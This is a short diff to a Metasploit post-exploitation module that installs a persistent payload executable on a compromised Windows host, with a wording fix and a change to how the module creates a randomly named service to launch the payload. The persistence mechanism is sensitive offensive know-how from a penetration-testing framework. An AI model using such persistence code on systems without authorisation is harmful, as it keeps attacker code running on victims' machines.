@@ -20,7 +20,7 @@ class MetasploitModule < Msf::Post
     super(update_info(info,
                       'Name' => 'Windows Manage Persistent EXE Payload Installer',
                       'Description'   => %q(
-                            This Module will upload a executable to a remote host and make it Persistent.
+                            This Module will upload an executable to a remote host and make it Persistent.
                             It can be installed as USER, SYSTEM, or SERVICE. USER will start on user login,
                             SYSTEM will start on system boot but requires privs. SERVICE will create a new service
                             which will start the payload. Again requires privs.
@@ -140,7 +140,7 @@ class MetasploitModule < Msf::Post
       print_status("Installing as service..")
       nam = Rex::Text.rand_text_alpha(rand(8) + 8)
       print_status("Creating service #{nam}")
-      service_create(nam, nam, "cmd /c \"#{script_on_target}\"")
+      service_create(nam, :path=>"cmd /c \"#{script_on_target}\"")
       @clean_up_rc << "execute -H -f sc -a \"delete #{nam}\"\n"
     else
       print_error("Insufficient privileges to create service")
